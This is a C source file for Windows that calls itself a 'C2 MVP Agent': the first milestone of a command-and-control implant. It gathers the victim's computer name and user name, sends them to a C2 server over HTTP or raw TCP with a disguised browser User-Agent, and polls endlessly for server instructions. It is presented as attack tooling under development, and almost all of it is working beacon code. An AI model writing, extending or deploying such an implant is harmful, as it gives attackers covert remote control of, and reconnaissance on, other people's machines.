#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>

// Configuration for the MVP
#define C2_SERVER      "127.0.0.1"
#define C2_PORT        8000
#define C2_ENDPOINT    "/index.html"
#define SLEEP_INTERVAL 5000 // 5 seconds
#define BUFFER_SIZE    1024
#define HOST_METADATA_SIZE 256
#define HTTP_HEADER_SIZE   512

typedef enum _TRANSPORT_MODE {
    TRANSPORT_HTTP,
    TRANSPORT_RAW
} TRANSPORT_MODE;

/**
 * Collects basic host identity and serializes it for transport.
 */
int CollectHostMetadata(char *buffer, size_t bufferSize) {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[256];
    DWORD computerNameSize = sizeof(computerName);
    DWORD userNameSize = sizeof(userName);
    int written = 0;

    if (!buffer || bufferSize == 0) {
        return -1;
    }

    SecureZeroMemory(buffer, bufferSize);
    SecureZeroMemory(computerName, sizeof(computerName));
    SecureZeroMemory(userName, sizeof(userName));

    if (!GetComputerNameA(computerName, &computerNameSize)) {
        snprintf(computerName, sizeof(computerName), "unknown");
    }

    if (!GetUserNameA(userName, &userNameSize)) {
        snprintf(userName, sizeof(userName), "unknown");
    }

    written = snprintf(buffer,
                       bufferSize,
                       "computer=%s;user=%s",
                       computerName,
                       userName);

    if (written < 0 || (size_t)written >= bufferSize) {
        return -1;
    }

    return written;
}

/**
 * Executes a single network poll to the Python testing server.
 * Handles allocation and teardown of Windows network handles cleanly.
 */
void PerformHttpPoll(void) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char buffer[BUFFER_SIZE];
    char metadata[HOST_METADATA_SIZE];
    char headers[HTTP_HEADER_SIZE];
    DWORD bytesRead = 0;
    BOOL success = FALSE;
    int metadataLength = 0;
    int headerLength = 0;

    // Zero out the buffer before use to guarantee no garbage memory is leaked or printed
    SecureZeroMemory(buffer, sizeof(buffer));
    SecureZeroMemory(metadata, sizeof(metadata));
    SecureZeroMemory(headers, sizeof(headers));

    // 1. Initialize the WinINet subsystem
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              INTERNET_OPEN_TYPE_DIRECT, 
                              NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] Failed to initialize WinINet. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    // 2. Establish a session connection to the target server
    hConnect = InternetConnectA(hInternet, 
                                C2_SERVER, 
                                C2_PORT, 
                                NULL, NULL, 
                                INTERNET_SERVICE_HTTP, 
                                0, 0);
    if (!hConnect) {
        printf("[-] Connection session failed. Target server likely offline.\n");
        goto CLEANUP;
    }

    // 3. Prepare the HTTP GET request
    hRequest = HttpOpenRequestA(hConnect, 
                                "GET", 
                                C2_ENDPOINT, 
                                NULL, NULL, NULL, 
                                INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 
                                0);
    if (!hRequest) {
        printf("[-] Failed to open HTTP request handle. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    metadataLength = CollectHostMetadata(metadata, sizeof(metadata));
    if (metadataLength <= 0) {
        printf("[-] Failed to collect host metadata.\n");
        goto CLEANUP;
    }

    headerLength = snprintf(headers,
                            sizeof(headers),
                            "X-Agent-Metadata: %s\r\n",
                            metadata);
    if (headerLength < 0 || (size_t)headerLength >= sizeof(headers)) {
        printf("[-] Failed to build metadata header.\n");
        goto CLEANUP;
    }

    // 4. Send the request to the server
    success = HttpSendRequestA(hRequest, headers, (DWORD)-1L, NULL, 0);
    if (!success) {
        printf("[-] HttpSendRequest failed. Server dropped packet or port closed.\n");
        goto CLEANUP;
    }

    // 5. Safely read the incoming data stream into our bounded buffer
    // Leaving 1 byte at the end of the buffer to manually guarantee a null terminator '\0'
    success = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
    if (success && bytesRead > 0) {
        buffer[bytesRead] = '\0'; // Explicit boundary safety
        printf("[+] Server Instruction Received: %s\n", buffer);
    } else if (bytesRead == 0) {
        printf("[*] Check-in successful, but server returned an empty instruction.\n");
    } else {
        printf("[-] Failed to read server response stream. Error: %lu\n", GetLastError());
    }

CLEANUP:
    // Resource Management: Close handles in reverse order of creation
    // This structured cleanup prevents memory leaks over days of execution
    if (hRequest)  InternetCloseHandle(hRequest);
    if (hConnect)  InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
}

/**
 * Builds the outbound raw socket payload.
 * Replace this body to layer a custom binary or text protocol over TCP.
 */
static int BuildRawSocketPayload(char *buffer, size_t bufferSize) {
    char metadata[HOST_METADATA_SIZE];
    int written = 0;
    int metadataLength = 0;

    if (!buffer || bufferSize == 0) {
        return -1;
    }

    SecureZeroMemory(metadata, sizeof(metadata));

    metadataLength = CollectHostMetadata(metadata, sizeof(metadata));
    if (metadataLength <= 0) {
        return -1;
    }

    written = snprintf(buffer,
                       bufferSize,
                       "GET %s HTTP/1.1\r\n"
                       "Host: %s:%d\r\n"
                       "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                       "X-Agent-Metadata: %s\r\n"
                       "Connection: close\r\n"
                       "\r\n",
                       C2_ENDPOINT,
                       C2_SERVER,
                       C2_PORT,
                       metadata);

    if (written < 0 || (size_t)written >= bufferSize) {
        return -1;
    }

    return written;
}

/**
 * Executes a single raw TCP socket poll.
 * The default payload mirrors an HTTP GET so existing test servers still work,
 * while the socket path can be adapted for custom protocols.
 */
void PerformRawSocketPoll(void) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    char sendBuffer[BUFFER_SIZE];
    char recvBuffer[BUFFER_SIZE];
    int payloadLength = 0;
    int bytesSent = 0;
    int bytesReceived = 0;
    int wsaStarted = 0;

    SecureZeroMemory(&serverAddr, sizeof(serverAddr));
    SecureZeroMemory(sendBuffer, sizeof(sendBuffer));
    SecureZeroMemory(recvBuffer, sizeof(recvBuffer));

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] Failed to initialize Winsock. Error: %d\n", WSAGetLastError());
        goto CLEANUP;
    }
    wsaStarted = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Failed to create raw socket. Error: %d\n", WSAGetLastError());
        goto CLEANUP;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_PORT);

    if (InetPtonA(AF_INET, C2_SERVER, &serverAddr.sin_addr) != 1) {
        printf("[-] Invalid C2 server address for raw socket mode: %s\n", C2_SERVER);
        goto CLEANUP;
    }

    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("[-] Raw socket connection failed. Error: %d\n", WSAGetLastError());
        goto CLEANUP;
    }

    payloadLength = BuildRawSocketPayload(sendBuffer, sizeof(sendBuffer));
    if (payloadLength <= 0) {
        printf("[-] Failed to build raw socket payload.\n");
        goto CLEANUP;
    }

    while (bytesSent < payloadLength) {
        int result = send(sock,
                          sendBuffer + bytesSent,
                          payloadLength - bytesSent,
                          0);
        if (result == SOCKET_ERROR) {
            printf("[-] Raw socket send failed. Error: %d\n", WSAGetLastError());
            goto CLEANUP;
        }
        bytesSent += result;
    }

    bytesReceived = recv(sock, recvBuffer, sizeof(recvBuffer) - 1, 0);
    if (bytesReceived > 0) {
        recvBuffer[bytesReceived] = '\0';
        printf("[+] Raw Socket Response Received: %s\n", recvBuffer);
    } else if (bytesReceived == 0) {
        printf("[*] Raw socket check-in successful, but server closed with no data.\n");
    } else {
        printf("[-] Raw socket receive failed. Error: %d\n", WSAGetLastError());
    }

CLEANUP:
    if (sock != INVALID_SOCKET) closesocket(sock);
    if (wsaStarted) WSACleanup();
}

static void PrintUsage(const char *programName) {
    printf("Usage: %s [--transport http|raw] [--raw]\n", programName);
    printf("  Default: --transport http\n");
}

static int ParseTransportMode(int argc, char **argv, TRANSPORT_MODE *mode) {
    int i = 0;

    if (!mode) {
        return 0;
    }

    *mode = TRANSPORT_HTTP;

    for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--raw") == 0) {
            *mode = TRANSPORT_RAW;
        } else if (strcmp(argv[i], "--transport") == 0) {
            if (i + 1 >= argc) {
                return 0;
            }

            i++;
            if (strcmp(argv[i], "http") == 0) {
                *mode = TRANSPORT_HTTP;
            } else if (strcmp(argv[i], "raw") == 0) {
                *mode = TRANSPORT_RAW;
            } else {
                return 0;
            }
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            return 0;
        } else {
            return 0;
        }
    }

    return 1;
}

int main(int argc, char **argv) {
    TRANSPORT_MODE transportMode = TRANSPORT_HTTP;

    if (!ParseTransportMode(argc, argv, &transportMode)) {
        PrintUsage(argv[0]);
        return 1;
    }

    printf("[*] =========================================\n");
    printf("[*] C2 MVP Agent Active (Milestone 1)\n");
    printf("[*] Target C2 Node: %s:%d%s\n", C2_SERVER, C2_PORT, C2_ENDPOINT);
    printf("[*] Transport Mode: %s\n", transportMode == TRANSPORT_HTTP ? "http" : "raw");
    printf("[*] =========================================\n\n");

    // Infinite execution loop
    while (TRUE) {
        if (transportMode == TRANSPORT_HTTP) {
            PerformHttpPoll();
        } else {
            PerformRawSocketPoll();
        }
        
        printf("[*] Loop cycle complete. Sleeping for %dms...\n\n", SLEEP_INTERVAL);
        Sleep(SLEEP_INTERVAL);
    }

    return 0;
}
